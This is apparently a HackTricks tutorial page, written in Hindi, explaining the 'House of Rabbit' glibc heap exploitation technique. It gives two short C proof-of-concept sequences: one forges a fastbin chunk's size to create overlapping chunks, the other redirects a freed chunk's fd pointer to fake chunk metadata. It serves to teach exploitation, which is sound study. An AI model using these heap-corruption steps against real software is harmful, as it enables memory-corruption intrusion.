# House of Rabbit

{{#include ../../banners/hacktricks-training.md}}

### Requirements

1. **तेज बिन fd पॉइंटर या आकार को संशोधित करने की क्षमता**: इसका मतलब है कि आप तेज बिन में एक चंक के आगे के पॉइंटर या उसके आकार को बदल सकते हैं।
2. **`malloc_consolidate` को ट्रिगर करने की क्षमता**: यह एक बड़े चंक को आवंटित करके या शीर्ष चंक को मर्ज करके किया जा सकता है, जो हीप को चंक्स को समेकित करने के लिए मजबूर करता है।

### Goals

1. **ओवरलैपिंग चंक्स बनाना**: एक चंक को दूसरे के साथ ओवरलैप करने के लिए, जिससे आगे की हीप हेरफेर की अनुमति मिल सके।
2. **नकली चंक्स को फोर्ज करना**: आवंटक को एक नकली चंक को हीप ऑपरेशनों के दौरान एक वैध चंक के रूप में मानने के लिए धोखा देना।

## Steps of the attack

### POC 1: तेज बिन चंक के आकार को संशोधित करें

**Objective**: तेज बिन चंक के आकार को संशोधित करके एक ओवरलैपिंग चंक बनाना।

- **Step 1: चंक्स आवंटित करें**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x40);  // Allocates another chunk of 0x40 bytes at 0x602050
malloc(0x10);                          // Allocates a small chunk to change the fastbin state
```
हम 0x40 बाइट्स के दो टुकड़े आवंटित करते हैं। इन टुकड़ों को मुक्त करने के बाद फास्ट बिन सूची में रखा जाएगा।

- **Step 2: Free Chunks**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
free(chunk2);  // Frees the chunk at 0x602050
```
हम दोनों चंक्स को मुक्त करते हैं, उन्हें फास्टबिन सूची में जोड़ते हैं।

- **चरण 3: चंक आकार को संशोधित करें**
```cpp
chunk1[-1] = 0xa1;  // Modify the size of chunk1 to 0xa1 (stored just before the chunk at chunk1[-1])
```
हम `chunk1` के आकार के मेटाडेटा को 0xa1 में बदलते हैं। यह समेकन के दौरान आवंटक को धोखा देने के लिए एक महत्वपूर्ण कदम है।

- **चरण 4: `malloc_consolidate` को ट्रिगर करें**
```cpp
malloc(0x1000);  // Allocate a large chunk to trigger heap consolidation
```
एक बड़ा हिस्सा आवंटित करने से `malloc_consolidate` फ़ंक्शन सक्रिय होता है, जो तेज़ बिन में छोटे हिस्सों को मिलाता है। `chunk1` के हेरफेर किए गए आकार के कारण यह `chunk2` के साथ ओवरलैप करता है।

संविलयन के बाद, `chunk1` `chunk2` के साथ ओवरलैप करता है, जिससे आगे के शोषण की अनुमति मिलती है।

### POC 2: `fd` पॉइंटर को संशोधित करें

**उद्देश्य**: तेज़ बिन `fd` पॉइंटर को हेरफेर करके एक नकली हिस्सा बनाना।

- **चरण 1: हिस्से आवंटित करें**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x100); // Allocates a chunk of 0x100 bytes at 0x602050
```
**व्याख्या**: हम दो टुकड़े आवंटित करते हैं, एक छोटा और एक बड़ा, ताकि नकली टुकड़े के लिए हीप सेट किया जा सके।

- **चरण 2: नकली टुकड़ा बनाएं**
```cpp
chunk2[1] = 0x31;  // Fake chunk size 0x30
chunk2[7] = 0x21;  // Next fake chunk
chunk2[11] = 0x21; // Next-next fake chunk
```
हम `chunk2` में नकली चंक मेटाडेटा लिखते हैं ताकि छोटे चंक्स का अनुकरण किया जा सके।

- **चरण 3: `chunk1` को मुक्त करें**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
```
**व्याख्या**: हम `chunk1` को मुक्त करते हैं, इसे फास्टबिन सूची में जोड़ते हैं।

- **चरण 4: `chunk1` का `fd` संशोधित करें**
```cpp
chunk1[0] = 0x602060;  // Modify the fd of chunk1 to point to the fake chunk within chunk2
```
**व्याख्या**: हम `chunk1` के फॉरवर्ड पॉइंटर (`fd`) को हमारे फेक चंक की ओर इंगित करने के लिए बदलते हैं जो `chunk2` के अंदर है।

- **चरण 5: `malloc_consolidate` को ट्रिगर करें**
```cpp
malloc(5000);  // Allocate a large chunk to trigger heap consolidation
```
एक बड़ा हिस्सा फिर से आवंटित करने से `malloc_consolidate` सक्रिय होता है, जो नकली हिस्से को संसाधित करता है।

नकली हिस्सा फास्टबिन सूची का हिस्सा बन जाता है, जिससे यह आगे की शोषण के लिए एक वैध हिस्सा बन जाता है।

### सारांश

**हाउस ऑफ़ रैबिट** तकनीक में या तो एक फास्ट बिन हिस्से के आकार को संशोधित करना शामिल है ताकि ओवरलैपिंग हिस्से बनाए जा सकें या नकली हिस्से बनाने के लिए `fd` पॉइंटर को हेरफेर करना शामिल है। यह हमलावरों को हीप में वैध हिस्से बनाने की अनुमति देता है, जिससे विभिन्न प्रकार के शोषण की अनुमति मिलती है। इन चरणों को समझना और अभ्यास करना आपकी हीप शोषण कौशल को बढ़ाएगा।

{{#include ../../banners/hacktricks-training.md}}
